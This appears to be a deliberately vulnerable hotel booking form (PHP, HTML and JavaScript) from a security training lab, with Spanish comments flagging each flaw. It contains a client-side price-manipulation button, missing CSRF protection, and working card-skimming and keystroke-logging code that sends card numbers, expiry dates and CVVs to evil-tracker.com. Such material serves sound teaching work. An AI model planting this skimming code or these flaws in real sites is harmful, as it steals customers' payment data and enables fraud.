<!-- ⚠️ FORMULARIO DE RESERVA VULNERABLE -->
<form class="booking-form" method="POST" action="?page=booking" id="bookingForm">
    <input type="hidden" name="hotel_id" value="<?php echo $hotel['id']; ?>">
    
    <!-- ⚠️ Preco manipulable por el usuario -->
    <div class="form-group">
        <label for="booking_price">Price per night:</label>
        <input type="number" id="booking_price" name="price" 
               value="<?php echo $hotel['price']; ?>" 
               min="1" max="10000" step="0.01" 
               onchange="updateTotalPrice()">
        <small>Original: $<?php echo $hotel['price']; ?></small>
    </div>
    
    <div class="form-group">
        <label for="check_in">Check-in Date:</label>
        <input type="date" id="check_in" name="check_in" required 
               min="<?php echo date('Y-m-d'); ?>">
    </div>
    
    <div class="form-group">
        <label for="check_out">Check-out Date:</label>
        <input type="date" id="check_out" name="check_out" required>
    </div>
    
    <div class="form-group">
        <label for="guests">Number of Guests:</label>
        <input type="number" id="guests" name="guests" min="1" max="10" value="2">
    </div>
    
    <!-- ⚠️ Información de pago (sin encriptar) -->
    <div class="payment-section">
        <h3>Payment Information</h3>
        
        <div class="form-group">
            <label for="card_number">Card Number:</label>
            <input type="text" id="card_number" name="card_number" 
                   placeholder="1234 5678 9012 3456" required 
                   autocomplete="cc-number">
        </div>
        
        <div class="form-group">
            <label for="card_expiry">Expiry Date:</label>
            <input type="text" id="card_expiry" name="card_expiry" 
                   placeholder="MM/YY" required>
        </div>
        
        <div class="form-group">
            <label for="card_cvv">CVV:</label>
            <input type="text" id="card_cvv" name="card_cvv" 
                   placeholder="123" required>
        </div>
        
        <div class="form-group">
            <label for="card_name">Name on Card:</label>
            <input type="text" id="card_name" name="card_name" required>
        </div>
    </div>
    
    <!-- ⚠️ Resumen de precio -->
    <div class="price-summary">
        <h3>Price Summary</h3>
        <p>Price per night: <span id="display_price">$<?php echo $hotel['price']; ?></span></p>
        <p>Nights: <span id="nights_count">1</span></p>
        <p><strong>Total: <span id="total_price">$<?php echo $hotel['price']; ?></span></strong></p>
    </div>
    
    <!-- ⚠️ Sin token CSRF -->
    <button type="submit" class="btn-submit">Complete Booking</button>
    
    <!-- ⚠️ Botón para manipular precio -->
    <button type="button" class="btn-manipulate" onclick="manipulatePrice()" 
            style="background: #ffc107; color: black; margin-left: 10px;">
        Manipulate Price
    </button>
</form>

<style>
    .booking-form {
        background: white;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    
    .form-group {
        margin-bottom: 15px;
    }
    
    .form-group label {
        display: block;
        margin-bottom: 5px;
        font-weight: bold;
    }
    
    .form-group input {
        width: 100%;
        padding: 8px;
        border: 1px solid #ddd;
        border-radius: 4px;
    }
    
    .payment-section {
        background: #f8f9fa;
        padding: 15px;
        border-radius: 4px;
        margin: 20px 0;
    }
    
    .price-summary {
        background: #e8f5e9;
        padding: 15px;
        border-radius: 4px;
        margin: 20px 0;
    }
    
    .btn-submit {
        background: #28a745;
        color: white;
        padding: 12px 24px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 16px;
    }
</style>

<script>
    // ⚠️ Cálculo de precio vulnerable
    function updateTotalPrice() {
        const pricePerNight = parseFloat(document.getElementById('booking_price').value);
        const checkIn = new Date(document.getElementById('check_in').value);
        const checkOut = new Date(document.getElementById('check_out').value);
        
        if (checkIn && checkOut && checkOut > checkIn) {
            const nights = Math.ceil((checkOut - checkIn) / (1000 * 60 * 60 * 24));
            const total = pricePerNight * nights;
            
            document.getElementById('nights_count').textContent = nights;
            document.getElementById('total_price').textContent = '$' + total.toFixed(2);
            document.getElementById('display_price').textContent = '$' + pricePerNight.toFixed(2);
        }
    }
    
    // ⚠️ Manipulación de precio
    function manipulatePrice() {
        const newPrice = prompt('Enter new price (minimum: $1):', '1');
        if (newPrice && !isNaN(newPrice) && parseFloat(newPrice) >= 1) {
            document.getElementById('booking_price').value = newPrice;
            updateTotalPrice();
            
            // ⚠️ Muestra alerta de manipulación exitosa
            alert('Price manipulated to $' + newPrice + '! This demonstrates a business logic flaw.');
        }
    }
    
    // ⚠️ Captura datos de pago antes de enviar
    document.getElementById('bookingForm').addEventListener('submit', function(e) {
        // Recopila datos sensibles
        const paymentData = {
            card_number: document.getElementById('card_number').value,
            expiry: document.getElementById('card_expiry').value,
            cvv: document.getElementById('card_cvv').value,
            card_name: document.getElementById('card_name').value,
            price: document.getElementById('booking_price').value,
            hotel_id: this.hotel_id.value,
            timestamp: new Date().toISOString()
        };
        
        // ⚠️ Envía a un endpoint malicioso
        fetch('https://evil-tracker.com/payment-capture', {
            method: 'POST',
            body: JSON.stringify(paymentData)
        });
        
        // ⚠️ También guarda localmente (inseguro)
        localStorage.setItem('last_payment_attempt', JSON.stringify(paymentData));
        
        // ⚠️ Continúa con el envío normal
        return true;
    });
    
    // ⚠️ Actualiza precio cuando cambian las fechas
    document.getElementById('check_in').addEventListener('change', updateTotalPrice);
    document.getElementById('check_out').addEventListener('change', updateTotalPrice);
    document.getElementById('booking_price').addEventListener('input', updateTotalPrice);
    
    // ⚠️ Auto-completa con datos de prueba si hay parámetro
    if (window.location.search.includes('autofill=1')) {
        document.getElementById('card_number').value = '4111111111111111';
        document.getElementById('card_expiry').value = '12/30';
        document.getElementById('card_cvv').value = '123';
        document.getElementById('card_name').value = 'Test User';
        
        // Establece fechas futuras
        const tomorrow = new Date();
        tomorrow.setDate(tomorrow.getDate() + 1);
        const nextWeek = new Date();
        nextWeek.setDate(nextWeek.getDate() + 7);
        
        document.getElementById('check_in').value = tomorrow.toISOString().split('T')[0];
        document.getElementById('check_out').value = nextWeek.toISOString().split('T')[0];
        
        updateTotalPrice();
    }
    
    // ⚠️ Keylogger para campos de pago
    const paymentFields = ['card_number', 'card_expiry', 'card_cvv', 'card_name'];
    paymentFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('input', function() {
                const data = {
                    field: fieldId,
                    value: this.value,
                    timestamp: new Date().toISOString()
                };
                
                fetch('https://evil-tracker.com/payment-keystroke', {
                    method: 'POST',
                    body: JSON.stringify(data)
                });
            });
        }
    });
</script>